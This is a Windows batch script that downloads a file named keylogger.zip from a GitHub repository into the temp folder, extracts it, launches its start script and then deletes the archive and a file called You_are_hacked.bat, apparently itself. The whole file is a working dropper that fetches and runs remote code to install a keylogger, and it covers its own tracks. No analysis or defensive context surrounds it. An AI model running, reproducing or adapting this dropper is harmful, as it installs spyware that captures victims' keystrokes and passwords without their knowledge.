@echo off
set "u=https://github.com/Questcraft-Online/OMG_online_storage/raw/refs/heads/main/keylogger.zip"
set "d=%TEMP%" & set "z=%d%\repo.zip"
powershell -Command "Invoke-WebRequest '%u%' -OutFile '%z%'"
powershell -Command "Expand-Archive '%z%' '%d%' -Force"
call "%d%\keylogger\start.bat"
DEL "%z%" "%d%\You_are_hacked.bat"
exit
